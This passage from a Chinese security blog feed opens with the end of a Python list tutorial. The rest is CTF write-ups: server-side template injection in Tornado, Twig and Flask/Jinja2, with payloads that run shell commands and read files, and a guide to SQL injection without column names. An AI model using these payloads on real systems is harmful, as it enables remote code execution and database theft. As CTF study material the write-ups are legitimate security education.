punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#remove 有 pop 一样的用法，可以在删除时调用。&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#remove 只删除第一次出现的值，如果有多个一样的都需要删除，需要用 while 循环。&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;huawei&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;oppo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;vivo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;apple&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;oppo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;vivo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;I will buy huawei phone&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;huawei&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;oppo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;vivo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;`&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;hr&gt;
&lt;h2 id=&#34;7列表相关方法在6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7列表相关方法在6&#34;&gt;#&lt;/a&gt; 7. 列表（相关方法在 6）&lt;/h2&gt;
&lt;p&gt;普通列表及访问&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;phones &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;apple&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;huawei&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;oppo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;vivo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;phones&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;		&lt;span class=&#34;token comment&#34;&gt;#全部打印&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;phones&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;		&lt;span class=&#34;token comment&#34;&gt;#单个打印&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;phones&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;	&lt;span class=&#34;token comment&#34;&gt;#索引 - 1 可以访问最后一个&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;apple&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;huawei&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;oppo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;vivo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;oppo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;vivo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
        <category term="python" />
        <updated>2021-06-29T10:41:39.545Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2021/06/28/ctf/web/ssti/(ctfwp)buu%E4%B8%ADssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</id>
        <title>(ctfwp)buu中ssti模板注入</title>
        <link rel="alternate" href="http://imfanqie.top/2021/06/28/ctf/web/ssti/(ctfwp)buu%E4%B8%ADssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
        <content type="html">&lt;p&gt;学习文章在前一篇&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;一-护网杯-2018easy_tornado&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-护网杯-2018easy_tornado&#34;&gt;#&lt;/a&gt; 一、[护网杯 2018] easy_tornado&lt;/h1&gt;
&lt;p&gt;打开题目，只有三个链接，如图，&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/JpSrnqcu9QzgRk1.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;依次点开&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/GUD9pRAlmoFywSE.png&#34; alt=&#34;1.2.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/7girIkdaASC4O1x.png&#34; alt=&#34;1.3.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/dZghu8sTqkKbjzC.png&#34; alt=&#34;1.4.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;根据每个网址的链接和 flag 页面的内容可以推测，flag 应该是&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;filename=/fllllllllllllag&amp;amp;filehash=md5(cookie_secret+md5(filename))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这种格式。&lt;/p&gt;
&lt;p&gt;所以本题的关键在 cookie_secret&lt;/p&gt;
&lt;p&gt;根据第二个链接内容，百度 render 可以发现，render () 是 tornado 里的函数，可以生成 html 模板。&lt;/p&gt;
&lt;p&gt;我们对网站进行尝试注入，看是否有注入点&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;filename=/fllllllllllllag&amp;amp;filehash=&amp;#123;&amp;#123;7*7&amp;#125;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/Q3sXjMgDWcJ6C5P.png&#34; alt=&#34;1.5.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现网页报错，但明显还能尝试注入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;error?msg=&amp;#123;&amp;#123;7*7&amp;#125;&amp;#125;    和        error?msg=&amp;#123;&amp;#123;7&amp;#125;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;发现当输入 7*7 时，返回 orz；输入 7 时，返回 7&lt;/p&gt;
&lt;p&gt;说明可以注入，但 * 可能被过滤&lt;/p&gt;
&lt;p&gt;因为存在注入点，所以我们需要寻找 cookie_secret 路径&lt;/p&gt;
&lt;p&gt;百度发现，其存在位置为 handler.settings&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/qdHivX4ErBChAVl.png&#34; alt=&#34;1.6.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;进行注入得&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/JmMcOqjIdl3gPoz.png&#34; alt=&#34;1.7.png&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&#39;cookie_secret&#39;: &#39;3b278e82-468b-487a-8cd2-bcf53c8a19d0&#39;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因为 md5 (filename)=md5 (/fllllllllllllag)=3bf9f6cf685a6dd8defadabfb41a03a1&lt;/p&gt;
&lt;p&gt;拼接后加密得 2bd5cf6fe358fa26518f4bca650e3a79&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/nIfBHhM9GJyP4qo.png&#34; alt=&#34;1.8.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;最后输入 payload 进行查询，得到 flag&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;fllllllllllllag&amp;amp;filehash=2bd5cf6fe358fa26518f4bca650e3a79
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/YGEbvcOZQahAgXN.png&#34; alt=&#34;1.9.png&#34;&gt;&lt;/p&gt;
&lt;p 5d8b767c-07af-46ff-831d-30e9c7f4d32b&gt;flag&lt;/p&gt;
&lt;h1 id=&#34;二-bjdctf2020cookie-is-so-stable&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-bjdctf2020cookie-is-so-stable&#34;&gt;#&lt;/a&gt; 二、[BJDCTF2020] Cookie is so stable&lt;/h1&gt;
&lt;p&gt;打开题目，需要输入 id，随便输入后发现找不到 flag&lt;/p&gt;
&lt;p&gt;尝试注入&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/d4uegtnoZ23Mixs.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/PQh4XlbSKHNEROI.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;发现有明显的注入漏洞，又因为结构为 49 且基于 php，可以推测出模板为 twig。根据源码提示进行抓包，发现 uesr 是注入点&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/fHLoWiB8U1sbYk3.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;直接百度或根据上一篇文章的 payload 进行注入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;#123;_self.env.registerUndefinedFilterCallback(&#34;exec&#34;)&amp;#125;&amp;#125;&amp;#123;&amp;#123;_self.env.getFilter(&#34;cat /flag&#34;)&amp;#125;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/SjmhFaxnIwDeRfQ.png&#34; alt&gt;&lt;/p&gt;
&lt;p d7ef7d9d-6ba4-4dd5-88ec-33500d9b2ad3&gt;得 flag&lt;/p&gt;
&lt;h1 id=&#34;三-gyctf2020flaskapp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三-gyctf2020flaskapp&#34;&gt;#&lt;/a&gt; 三、[GYCTF2020] FlaskApp&lt;/h1&gt;
&lt;p&gt;进去是这个页面，提示里没有信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/UHkAdws5ZrXfgQb.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;随便尝试后，发现加密中可以注入代码，解密就能得到值：&lt;/p&gt;
&lt;p&gt;注入 14 得 e3s3Kzd9fQ== 翻译得 14&lt;/p&gt;
&lt;p&gt;但再注入 49 时，加密得 e3s3Kjd9fQ==&lt;/p&gt;
&lt;p&gt;再解密却得&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/FkX7dReBKsACnqS.png&#34; alt=&#34;3.2.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;说明存在过滤&lt;/p&gt;
&lt;p&gt;尝试注入查找目录&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__==&#39;catch_warnings&#39; %&amp;#125;&amp;#123;&amp;#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&#34;__import__(&#39;os&#39;).popen(&#39;ls /&#39;).read()&#34;)&amp;#125;&amp;#125;&amp;#123;% endif %&amp;#125;&amp;#123;% endfor %&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/y8W4mGaiohPDg3J.png&#34; alt=&#34;3.3.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现又被过滤了，于是考虑查看源码，在解密中随便输入进入 debug：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/aEpY5PSDMlKTwHf.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;可以发现，在输出结果时有过滤，存在于 app.py 的 waf 中，百度一下 payload，尝试读取文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__==&#39;catch_warnings&#39; %&amp;#125;&amp;#123;&amp;#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;, &#39;r&#39;).read() &amp;#125;&amp;#125;&amp;#123;% endif %&amp;#125;&amp;#123;% endfor %&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/W8zvhqFBGKiSnP5.png&#34; alt=&#34;3.5.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;找到了被过滤的字符&lt;/p&gt;
&lt;p&gt;拼接 os 和 import 构造 payload 寻找目录：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;#123;&#39;&#39;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;/&#39;)&amp;#125;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/mVvwtf8ODhnukRW.png&#34; alt=&#34;3.6.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后拼接 flag，读取文件：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__==&#39;catch_warnings&#39; %&amp;#125;&amp;#123;&amp;#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/this_is_the_fl&#39;+&#39;ag.txt&#39;,&#39;r&#39;).read()&amp;#125;&amp;#125;&amp;#123;% endif %&amp;#125;&amp;#123;% endfor %&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/QqiFUklB1j2MESu.png&#34; alt=&#34;3.7.png&#34;&gt;&lt;/p&gt;
&lt;p f8cc4e99-1ec3-49f2-b0be-b92686d4ff31&gt;得到 flag&lt;/p&gt;
&lt;h1 id=&#34;四-部分payload总结快速使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#四-部分payload总结快速使用&#34;&gt;#&lt;/a&gt; 四、部分 payload 总结，快速使用&lt;/h1&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly8yNzQwOTA4OTExLmdpdGh1Yi5pby8yMDIxLzA2LzI4L2J1dSVFNCVCOCVBRCVFNyU5QSU4NCVFOSU4MyVBOCVFNSU4OCU4NnNzdGklRTglQTclQTMlRTklQTIlOTglRTglQkYlODclRTclQTglOEIv&#34;&gt;buu 中的部分 ssti 解题过程&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94aTRvcjB1amkuZ2l0aHViLmlvLzIwMTkvMDEvMTUvZmxhc2slRTQlQjklOEJzc3RpJUU2JUE4JUExJUU2JTlEJUJGJUU2JUIzJUE4JUU1JTg1JUE1LyMlRTYlOTQlQkIlRTUlODclQkI=&#34;&gt;flask 之 ssti 模板注入&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDUxNTgzNi9hcnRpY2xlL2RldGFpbHMvMTEzNzc4MjMz&#34;&gt;ssti 详解与例题以及绕过 payload 大全&lt;/span&gt;&lt;/p&gt;
</content>
        <category term="SSTI" />
        <updated>2021-06-28T12:51:13.874Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2021/06/21/ctf/web/sql/ctfweb-sql%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/</id>
        <title>ctfweb-sql无列名注入</title>
        <link rel="alternate" href="http://imfanqie.top/2021/06/21/ctf/web/sql/ctfweb-sql%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/"/>
        <content type="html">&lt;p&gt;谈谈 sql 注入无列名的情况&lt;/p&gt;
&lt;p&gt;以及该如何解题&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;无列名注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#无列名注入&#34;&gt;#&lt;/a&gt; &lt;em&gt;&lt;strong&gt;无列名注入&lt;/strong&gt;&lt;/em&gt;&lt;/h1&gt;
&lt;p&gt;顾名思义，就是在不知道列名的情况下进行 sql 注入。&lt;/p&gt;
&lt;p&gt;在大多数 CTF 题目中， &lt;code&gt;information_schema&lt;/code&gt;  库被过滤，称为无列名注入。&lt;/p&gt;
&lt;h1 id=&#34;方法总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法总结&#34;&gt;#&lt;/a&gt; 方法总结&lt;/h1&gt;
&lt;h3 id=&#34;基于union-select的无列名注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于union-select的无列名注入&#34;&gt;#&lt;/a&gt; &lt;em&gt;基于 union select 的无列名注入&lt;/em&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;一般 sql 查询：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;select * from admin
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;假设得到列名 id,name,password，则使用联合查询 union：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;select 1,2,3 union select * from admin
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;则，数字会替换成列名（联合查询的特性，拼接表），所以 1,2,3 分别对应了 id，name，password&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;select b from (select 1,2,3 as b union select * from admin)a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;（b 是 3 的重命名，a 是任意字符，用于命名）&lt;/p&gt;
&lt;p&gt;如果需要查多个列，用 concat () 函数即可。&lt;/p&gt;
&lt;p&gt;order by  用不了的情况下，可以用 group by 代替。&lt;/p&gt;
&lt;h3 id=&#34;基于join的无列名注入的场景与方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于join的无列名注入的场景与方法&#34;&gt;#&lt;/a&gt; 基于 join 的无列名注入的场景与方法&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;join 后的列名是两个表列名加起来的，可能会产⽣相同的列名，如 id 和 name，使⽤别名时，表中不能出现同的字段名，这就跟 join 第⼀个特点相冲突，所以在 join 和别名同时使⽤时会导致报错。&lt;/p&gt;
&lt;p&gt;当通过查询得到新的表时，必须有一个别名，即每个派生出来的表都必须有一个自己的别名。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;首先获取第一个列名&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;?id=-1&#39; union all select * from (select * from users as a join users as b)as c
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;as 主要作用是起别名，就是把 users 表当做 a 表，常规来说 as 可以省略&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;获取接下来的列名&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;?id=-1&#39; union all select*from (select * from users as a join users as b using(id,username))a
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;利用sysschema_auto_increment_columns-库来进行查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用sysschema_auto_increment_columns-库来进行查询&#34;&gt;#&lt;/a&gt; 利用 sys.schema_auto_increment_columns 库来进行查询&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;由于 performance_schema 过于发杂，所以 mysql 在 5.7 版本中新增了 sys schemma，基础数据来自于 performance_chema 和 information_schema 两个库，本身数据库不存储数据&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;mysql 默认是关闭 InnoDB 存储引擎的&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;注入中在 mysql 默认情况下就可以替代 information_schema 库的方法&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;获取库名：&lt;/em&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;schema_auto_increment_columns 
?id=-1&#39; union all select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;schema_table_statistics_with_buffer 
?id=-1&#39; union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;限制&lt;/strong&gt;：一般要超级管理员才可以访问 sys&lt;/p&gt;
&lt;p&gt;​			mysql ≥ 5.7 版本&lt;/p&gt;
&lt;p&gt;&lt;em&gt;获取字段名：&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;用 join 方法或者无列名注入。&lt;/p&gt;
&lt;h3 id=&#34;利用-innodb-中的库进行查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用-innodb-中的库进行查询&#34;&gt;#&lt;/a&gt; 利用 innodb 中的库进行查询&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;innodb_table_stats 存放库名&lt;/p&gt;
&lt;p&gt;innodb_table_index 存放表名&lt;/p&gt;
&lt;p&gt;使用方法同正常 sql 注入：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;select table_name from mysql.innodb_table_stats where database_name=库名xxx
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;** 限制：** 表引擎为 innodb&lt;/p&gt;
&lt;p&gt;​			mysql &amp;gt; 5.5&lt;/p&gt;
&lt;h3 id=&#34;通过报错来达到无列名查询目的&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#通过报错来达到无列名查询目的&#34;&gt;#&lt;/a&gt; 通过报错来达到无列名查询目的&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;爆库名：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;select 1,2,3 from users where 1=abc();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;爆表名：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;select 1,2,3 from users where Polygon(id);
select 1,2,3 from users where linestring(id);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;爆列名：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;select 1,2,3 from users where (select*from (select*from users as a join users as b)as c);
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;select 1,2,3 from users where (select*from (select*from users as a join users as b using (id))as c);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;前提是 users 表存在&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;END&lt;/p&gt;
</content>
        <category term="sql" />
        <updated>2021-06-20T17:04:45.964Z</updated>
    </entry>
